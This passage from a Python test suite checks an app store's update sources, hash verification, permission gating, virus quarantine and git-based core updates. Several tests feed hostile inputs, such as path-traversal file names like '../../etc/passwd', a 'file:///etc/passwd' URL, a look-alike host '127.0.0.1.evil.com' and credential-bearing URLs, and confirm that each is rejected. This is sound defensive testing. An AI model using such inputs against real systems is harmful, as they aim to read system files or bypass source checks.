        self.assertEqual((a["name"], a["source"], a["via"], a["known"]), ("hello", "local file", "install", True))
        self.assertEqual(a["location"], str(self.kapp))

    def test_apps_from_before_the_ledger_say_unknown_and_a_swapped_app_says_changed(self):
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        provenance.ledger_path(self.paths).unlink()
        self.assertEqual(provenance.apps(self.paths)[0]["source"], "unknown")
        provenance.record(self.paths, "hello", "1.0", "0" * 64, source="elsewhere", location="x", via="install")
        self.assertEqual(provenance.apps(self.paths)[0]["source"], "changed since recorded")

    def test_core_and_runtimes_are_reported_from_the_real_machine(self):
        c = provenance.core()
        self.assertEqual(c["kind"], "git")
        self.assertRegex(c["commit"], r"^[0-9a-f]{7,}$")
        self.assertNotIn("@", c["origin"].split("://", 1)[-1].split("/", 1)[0])      # no embedded credentials
        names = [r["name"] for r in provenance.runtimes()]
        for want in ("python", "node.js", "npm", "linux kernel"):
            self.assertIn(want, names)
        with tempfile.TemporaryDirectory() as d:
            self.assertEqual(provenance.core(Path(d))["kind"], "image")


class TestSourcesAndUpdates(Env):
    def setUp(self):
        super().setUp()
        AppStore(self.paths).install(self.kapp, self.authority(PW))           # hello 1.0
        self.srv = Path(self.tmp.name) / "srv"
        self.srv.mkdir()
        self.src = Sources(self.paths)

    def add_folder(self, name="shelf"):
        self.src.add(self.authority(PW), name, "folder", str(self.srv))

    def put(self, version, **kw):
        k = make_kapp(Path(self.tmp.name), version, **kw)
        _shutil.copy(k, self.srv / k.name)
        return k

    def installed_version(self):
        return {a.name: a.version for a in AppStore(self.paths).installed()}["hello"]

    # --- the list of sources ---------------------------------------------------
    def test_adding_and_removing_a_source_needs_the_password_and_valid_input(self):
        with self.assertRaises(AuthorizationDenied):
            self.src.add(self.authority("no", "no", "no"), "shelf", "folder", str(self.srv))
        self.assertEqual(self.src.list(), [])
        self.add_folder()
        self.assertEqual([s["name"] for s in self.src.list()], ["shelf"])
        for kind, loc in (("folder", "relative/dir"), ("folder", "/nonexistent-dir"), ("github", "not a repo"),
                          ("github", "a/b/c"), ("https", "http://example.com"), ("https", "https://u:p@example.com/x"),
                          ("https", "https://example.com/x?token=1"), ("ftp", "x"), ("https", "file:///etc")):
            with self.assertRaises(SourceError, msg=(kind, loc)):
                self.src.add(self.authority(PW), "other", kind, loc)
        with self.assertRaises(SourceError):
            self.src.add(self.authority(PW), "shelf", "folder", str(self.srv))       # duplicate
        with self.assertRaises(SourceError):
            self.src.add(self.authority(PW), "Bad Name", "folder", str(self.srv))
        self.src.remove(self.authority(PW), "shelf")
        self.assertEqual(self.src.list(), [])

    # --- checking and installing from a folder ------------------------------------
    def test_check_needs_the_password_and_finds_only_newer_versions(self):
        self.add_folder()
        self.put("1.1")
        self.put("0.9", extra=b"old")                                              # older: never offered
        with self.assertRaises(AuthorizationDenied):
            self.src.check(self.authority("no", "no", "no"), include_core=False)
        r = self.src.check(self.authority(PW), include_core=False)
        self.assertEqual([(u["name"], u["installed"], u["version"], u["source"]) for u in r["updates"]],
                         [("hello", "1.0", "1.1", "shelf")])
        self.assertEqual(r["new"], [])

    def test_install_updates_records_where_it_came_from_and_clears_the_pending_update(self):
        self.add_folder()
        k = self.put("1.1")
        self.src.check(self.authority(PW), include_core=False)
        msg = self.src.install(self.authority(PW), "hello")
        self.assertIn("1.0 -> 1.1", msg)
        self.assertEqual(self.installed_version(), "1.1")
        a = provenance.apps(self.paths)[0]
        self.assertEqual((a["source"], a["via"], a["known"]), ("shelf", "update", True))
        self.assertEqual(a["location"], str(self.srv / k.name))
        self.assertEqual(self.src.last_report()["updates"], [])
        with self.authority(PW).authorize("app.run", "hello") as g:
            self.assertEqual(AppStore(self.paths).load_verified("hello", g).manifest.version, "1.1")   # sealed + verifies

    def test_install_without_a_check_and_a_wrong_password_do_nothing(self):
        self.add_folder()
        self.put("1.1")
        with self.assertRaises(SourceError):
            self.src.install(self.authority(PW), "hello")
        self.src.check(self.authority(PW), include_core=False)
        with self.assertRaises(AuthorizationDenied):
            self.src.install(self.authority("no", "no", "no"), "hello")
        self.assertEqual(self.installed_version(), "1.0")

    def test_a_new_app_is_offered_installed_but_not_permitted(self):
        self.add_folder()
        self.put("1.0", name="clock")
        r = self.src.check(self.authority(PW), include_core=False)
        self.assertEqual([n["name"] for n in r["new"]], ["clock"])
        self.assertIn("still needs: permit clock", self.src.install(self.authority(PW), "clock"))
        self.assertFalse(PermitStore(self.paths).is_permitted("clock"))

    def test_an_update_that_asks_for_new_permissions_is_held_back_until_approved(self):
        self.add_folder()
        self.put("1.2", permissions=("network",))
        r = self.src.check(self.authority(PW), include_core=False)
        self.assertEqual(r["updates"][0]["adds_permissions"], ["network"])
        with self.assertRaises(SourceError) as ctx:
            self.src.install(self.authority(PW), "hello")
        self.assertIn("NEW permissions (network)", str(ctx.exception))
        self.assertEqual(self.installed_version(), "1.0")
        self.assertEqual([l for l in self.src.install_all(self.authority())][0].split(":")[0], "hello")   # skipped, no prompt
        self.src.install(self.authority(PW), "hello", allow_new_permissions=True)
        self.assertEqual(self.installed_version(), "1.2")

    def test_a_flagged_update_is_quarantined_and_the_old_version_stays(self):
        self.add_folder()
        self.put("1.1", extra=EICAR)
        self.src.check(self.authority(PW), include_core=False)
        with self.assertRaises(VirusFoundError):
            self.src.install(self.authority(), "hello")                             # refused before any password
        self.assertEqual(self.installed_version(), "1.0")
        self.assertEqual(len(list((self.paths.state / "quarantine").glob("hello-*.kapp"))), 1)

    # --- an https source (a real local web server) ---------------------------------
    def serve(self, directory):
        handler = _ft.partial(_http.SimpleHTTPRequestHandler, directory=str(directory))
        handler.log_message = lambda *a, **k: None
        httpd = _http.ThreadingHTTPServer(("127.0.0.1", 0), handler)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        self.addCleanup(lambda: (httpd.shutdown(), httpd.server_close()))
        return f"http://127.0.0.1:{httpd.server_port}"

    def index(self, *entries):
        (self.srv / "kapps.json").write_text(json.dumps({"apps": list(entries)}))

    def entry(self, k: Path, **over):
        return {"name": "hello", "version": "1.1", "file": k.name, "sha256": _hl.sha256(k.read_bytes()).hexdigest(), **over}

    def test_a_website_source_downloads_and_verifies_the_hash(self):
        k = self.put("1.1")
        self.index(self.entry(k))
        base = self.serve(self.srv)
        web = Sources(self.paths, allow_http=True)
        web.add(self.authority(PW), "site", "https", base)
        r = web.check(self.authority(PW), include_core=False)
        self.assertEqual(r["updates"][0]["ref"], f"{base}/{k.name}")
        web.install(self.authority(PW), "hello")
        self.assertEqual(self.installed_version(), "1.1")
        self.assertEqual(provenance.apps(self.paths)[0]["source"], "site")

    def test_a_download_that_does_not_match_its_advertised_hash_is_refused(self):
        k = self.put("1.1")
        self.index(self.entry(k, sha256="0" * 64))
        base = self.serve(self.srv)
        web = Sources(self.paths, allow_http=True)
        web.add(self.authority(PW), "site", "https", base)
        web.check(self.authority(PW), include_core=False)
        with self.assertRaises(SourceError) as ctx:
            web.install(self.authority(), "hello")
        self.assertIn("does not match the hash", str(ctx.exception))
        self.assertEqual(self.installed_version(), "1.0")

    def test_the_index_cannot_name_a_different_app_or_escape_its_folder(self):
        k = self.put("1.1")
        self.index(self.entry(k, file="../../etc/passwd"), self.entry(k, name="../evil"),
                   self.entry(k, version="x" * 90), {"name": "hello"}, "junk",
                   self.entry(k, name="other"))                                      # right file, wrong name
        base = self.serve(self.srv)
        web = Sources(self.paths, allow_http=True)
        web.add(self.authority(PW), "site", "https", base)
        r = web.check(self.authority(PW), include_core=False)
        self.assertEqual([n["name"] for n in r["new"]], ["other"])                   # only the well-formed one survives
        with self.assertRaises(SourceError) as ctx:
            web.install(self.authority(PW), "other")                                 # but the file is hello 1.1
        self.assertIn("not what the index said", str(ctx.exception))

    def test_plain_http_to_the_outside_world_is_never_fetched(self):
        """Refused by POLICY (checked before any connection is attempted), not merely unreachable."""
        from kos.sources import fetch
        calls = []
        with mock.patch("urllib.request.OpenerDirector.open", lambda *a, **k: calls.append(1)):
            for url in ("http://example.com/kapps.json", "file:///etc/passwd", "ftp://example.com/x",
                        "http://127.0.0.1.evil.com/x"):
                with self.assertRaises(SourceError, msg=url) as ctx:
                    fetch(url, 1000)
                self.assertIn("only https", str(ctx.exception), url)
            with self.assertRaises(SourceError) as ctx:
                fetch("https://user:pw@example.com/x", 1000)
            self.assertIn("must not contain a password", str(ctx.exception))
            with self.assertRaises(SourceError):
                fetch("http://127.0.0.1:1/x", 1000)                    # loopback http only when allow_http
        self.assertEqual(calls, [])                                   # no connection was even attempted

    def test_an_unreachable_source_is_an_error_line_not_a_crash(self):
        web = Sources(self.paths, allow_http=True)
        web.add(self.authority(PW), "dead", "https", "http://127.0.0.1:9")
        self.add_folder()
        self.put("1.1")
        r = web.check(self.authority(PW), include_core=False)
        self.assertTrue(r["errors"] and r["errors"][0].startswith("dead:"))
        self.assertEqual(r["updates"][0]["version"], "1.1")                          # the folder source still worked


class TestUpdatingKosItself(Env):
    def git(self, cwd, *args):
        return _sp.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false", *args],
                       cwd=cwd, check=True, capture_output=True, text=True).stdout.strip()

    def setUp(self):
        super().setUp()
        base = Path(self.tmp.name)
        self.origin, self.clone, self.pusher = base / "origin.git", base / "clone", base / "pusher"
        _sp.run(["git", "init", "-q", "--bare", "-b", "main", str(self.origin)], check=True)
        _sp.run(["git", "clone", "-q", str(self.origin), str(self.clone)], check=True, capture_output=True)
        (self.clone / "kos.txt").write_text("v1")
        self.git(self.clone, "add", "."); self.git(self.clone, "commit", "-q", "-m", "first")
        self.git(self.clone, "push", "-q", "origin", "HEAD:main")
        self.git(self.clone, "branch", "-q", "--set-upstream-to=origin/main")
        _sp.run(["git", "clone", "-q", str(self.origin), str(self.pusher)], check=True, capture_output=True)
        self.src = Sources(self.paths, core_root=self.clone)

    def publish(self, text, msg):
        (self.pusher / "kos.txt").write_text(text)
        self.git(self.pusher, "add", "."); self.git(self.pusher, "commit", "-q", "-m", msg)
        self.git(self.pusher, "push", "-q", "origin", "HEAD:main")

    def test_it_sees_new_commits_and_fast_forwards_with_the_password(self):
        self.assertEqual(self.src.core_status()["behind"], 0)
        self.publish("v2", "second change")
        self.publish("v3", "third change")
        st = self.src.core_status()
        self.assertEqual((st["behind"], st["subjects"]), (2, ["third change", "second change"]))
        with self.assertRaises(AuthorizationDenied):
            self.src.core_update(self.authority("no", "no", "no"))
        self.assertEqual((self.clone / "kos.txt").read_text(), "v1")
        self.assertIn("restart KOS", self.src.core_update(self.authority(PW)))
        self.assertEqual((self.clone / "kos.txt").read_text(), "v3")
        self.assertEqual(self.src.core_update(self.authority()), "KOS is up to date")

    def test_it_never_touches_a_modified_checkout_or_a_diverged_branch(self):
        self.publish("v2", "second")
        (self.clone / "kos.txt").write_text("local edit")
        with self.assertRaises(SourceError) as ctx:
            self.src.core_update(self.authority())
        self.assertIn("uncommitted", str(ctx.exception))
        self.assertEqual((self.clone / "kos.txt").read_text(), "local edit")
        self.git(self.clone, "commit", "-q", "-am", "my own commit")                 # now it has diverged
        with self.assertRaises(SourceError) as ctx:
            self.src.core_update(self.authority(PW))
        self.assertIn("cannot fast-forward", str(ctx.exception))

    def test_a_system_image_is_updated_by_a_new_image(self):
        with tempfile.TemporaryDirectory() as d:
            with self.assertRaises(SourceError) as ctx:
                Sources(self.paths, core_root=Path(d)).core_update(self.authority())
            self.assertIn("new image", str(ctx.exception))


class TestUpdatesThroughTheBridge(Env):
    def setUp(self):
        super().setUp()
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        self.srv = Path(self.tmp.name) / "srv"
        self.srv.mkdir()

    def ask(self, req, *answers):
        sent = []
        with mock.patch.object(Sources, "core_status", lambda self: {"kind": "image", "behind": 0, "subjects": []}):
            SystemBridge(self.paths).handle({"cmd": "request", "action": "updates", **req}, sent.append,
                                            self.authority(*answers))
        return sent[-1]

    def test_the_whole_flow(self):
        r = self.ask({"op": "provenance"})
        self.assertEqual((r["cmd"], r["data"]["apps"][0]["name"], r["data"]["sources"]), ("updates", "hello", []))
        self.assertTrue(self.ask({"op": "source_add", "name": "shelf", "kind": "folder", "location": str(self.srv)}, PW)["ok"])
        k = make_kapp(Path(self.tmp.name), "1.1")
        _shutil.copy(k, self.srv / k.name)
        self.assertFalse(self.ask({"op": "check"}, "no", "no", "no")["ok"])
        report = self.ask({"op": "check"}, PW)["data"]
        self.assertEqual(report["updates"][0]["version"], "1.1")
        self.assertIn("hello", self.ask({"op": "provenance"})["data"]["last"]["updates"][0]["name"])
        self.assertTrue(self.ask({"op": "install", "name": "hello"}, PW)["ok"])
        self.assertEqual({a.name: a.version for a in AppStore(self.paths).installed()}["hello"], "1.1")
        self.assertTrue(self.ask({"op": "source_remove", "name": "shelf"}, PW)["ok"])


class TestNoTicksWithoutThePermission(DesktopSessionEnv):
    def test_a_session_without_ticks_never_sends_one(self):
        s = self.start(EXAMPLE, "hello", "cmd")
        self.boot_both()
        threading.Timer(2.5, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=0.3)
        self.assertNotIn('"cmd":"tick"', self.output())


class TestUpdatesProtocol(unittest.TestCase):
    def v(self, **m):
        return validate_app_message({"cmd": "request", "action": "updates", **m}, "tui")

    def test_valid_and_hostile(self):
        self.assertEqual(self.v(op="check")["op"], "check")
        self.assertTrue(self.v(op="install", name="hello", permissions=True)["permissions"])
        self.assertFalse(self.v(op="install", name="hello", permissions="yes")["permissions"])
        self.assertEqual(self.v(op="source_add", name="shelf", kind="github", location="me/repo")["kind"], "github")
        for bad in (dict(op="rm"), dict(op="install"), dict(op="install", name="../x"),
                    dict(op="source_add", name="s", kind="ftp", location="x"),
                    dict(op="source_add", name="s", kind="folder", location=""),
                    dict(op="source_add", name="s", kind="folder", location="x" * 400)):
            with self.assertRaises(ProtocolError, msg=bad):
                self.v(**bad)
